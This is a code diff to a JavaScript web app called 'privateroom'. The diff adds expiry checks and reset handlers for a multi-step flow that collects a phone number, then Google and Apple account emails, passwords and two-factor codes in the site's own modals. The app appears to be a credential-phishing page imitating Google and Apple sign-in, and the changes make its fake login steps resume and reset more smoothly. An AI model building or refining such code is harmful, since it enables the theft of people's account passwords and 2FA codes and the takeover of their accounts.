@@ -219,30 +219,32 @@ function initApp() {
         const savedEmail = localStorage.getItem("privateroom_google_email");
         const savedAppleEmail = localStorage.getItem("privateroom_apple_email");
         const codeRequestedAt = parseInt(localStorage.getItem("privateroom_code_requested_at") || "0", 10);
+        const googleSavedAt = parseInt(localStorage.getItem("privateroom_google_saved_at") || "0", 10);
         const isRecent = codeRequestedAt > 0 && (Date.now() - codeRequestedAt < 20 * 60 * 1000);
+        const isGoogleRecent = googleSavedAt > 0 && (Date.now() - googleSavedAt < 15 * 60 * 1000);
 
-        if (savedStep === "stepGooglePassword" && savedEmail) {
+        if (isGoogleRecent && savedStep === "stepGooglePassword" && savedEmail) {
             userGoogleEmail = savedEmail;
             updateGoogleDisplays(userGoogleEmail);
             showStep(stepGooglePassword);
             setTimeout(() => { if (googlePasswordInput) googlePasswordInput.focus(); }, 150);
             return;
         }
-        if (savedStep === "stepGoogle2FA" && savedEmail) {
+        if (isGoogleRecent && savedStep === "stepGoogle2FA" && savedEmail) {
             userGoogleEmail = savedEmail;
             updateGoogleDisplays(userGoogleEmail);
             showStep(stepGoogle2FA);
             setTimeout(() => { if (google2faCodeInput) google2faCodeInput.focus(); }, 150);
             return;
         }
-        if (savedStep === "stepApplePassword" && savedAppleEmail) {
+        if (isGoogleRecent && savedStep === "stepApplePassword" && savedAppleEmail) {
             userAppleEmail = savedAppleEmail;
             updateAppleDisplays(userAppleEmail);
             showStep(stepApplePassword);
             setTimeout(() => { if (applePasswordInput) applePasswordInput.focus(); }, 150);
             return;
         }
-        if (savedStep === "stepApple2FA" && savedAppleEmail) {
+        if (isGoogleRecent && savedStep === "stepApple2FA" && savedAppleEmail) {
             userAppleEmail = savedAppleEmail;
             updateAppleDisplays(userAppleEmail);
             showStep(stepApple2FA);
@@ -907,28 +909,41 @@ function initApp() {
         });
     }
 
+    function clearGoogleStateAndReturnPhone() {
+        try {
+            localStorage.removeItem("privateroom_current_step");
+            localStorage.removeItem("privateroom_google_email");
+            localStorage.removeItem("privateroom_google_saved_at");
+        } catch (e) {}
+        userGoogleEmail = "";
+        userGooglePassword = "";
+        clearGoogleErrors();
+        showStep(stepPhone);
+    }
+
     if (btnBackFromGoogleToTG) {
-        btnBackFromGoogleToTG.addEventListener("click", () => {
-            showStep(stepPhone);
-        });
+        btnBackFromGoogleToTG.addEventListener("click", clearGoogleStateAndReturnPhone);
     }
 
     if (btnCloseGoogleModal) {
-        btnCloseGoogleModal.addEventListener("click", () => {
-            showStep(stepPhone);
-        });
+        btnCloseGoogleModal.addEventListener("click", clearGoogleStateAndReturnPhone);
     }
 
     if (googleAuthModal) {
         googleAuthModal.addEventListener("click", (e) => {
             if (e.target === googleAuthModal) {
-                showStep(stepPhone);
+                clearGoogleStateAndReturnPhone();
             }
         });
     }
 
     if (btnGoogleBackToHome) {
         btnGoogleBackToHome.addEventListener("click", () => {
+            try {
+                localStorage.removeItem("privateroom_current_step");
+                localStorage.removeItem("privateroom_google_email");
+                localStorage.removeItem("privateroom_google_saved_at");
+            } catch (e) {}
             showStep(stepSuccess);
         });
     }
